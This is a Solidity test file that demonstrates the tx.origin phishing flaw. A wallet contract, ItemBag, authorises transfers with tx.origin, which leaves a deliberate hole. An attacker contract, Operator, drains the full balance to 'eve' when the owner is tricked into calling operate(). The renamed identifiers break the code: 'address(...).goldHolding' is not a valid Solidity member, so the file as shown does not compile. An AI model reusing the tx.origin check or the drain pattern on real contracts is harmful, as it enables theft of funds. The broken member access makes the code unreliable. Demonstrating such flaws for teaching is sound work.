// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    ItemBag InventoryContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        InventoryContract = new ItemBag{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.log("Owner of wallet contract", InventoryContract.guildLeader());
        vm.prank(eve);
        OperatorContract = new Operator(InventoryContract);
        console.log("Owner of attack contract", OperatorContract.guildLeader());
        console.log("Eve of balance", address(eve).goldHolding);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).goldHolding);
    }

    receive() external payable {}
}

contract ItemBag {
    address public guildLeader;

    constructor() payable {
        guildLeader = msg.sender;
    }

    function giveItems(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == guildLeader, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public guildLeader;
    ItemBag inventory;

    constructor(ItemBag _treasurebag) {
        inventory = ItemBag(_treasurebag);
        guildLeader = payable(msg.sender);
    }

    function operate() public {
        inventory.giveItems(guildLeader, address(inventory).goldHolding);
    }
}
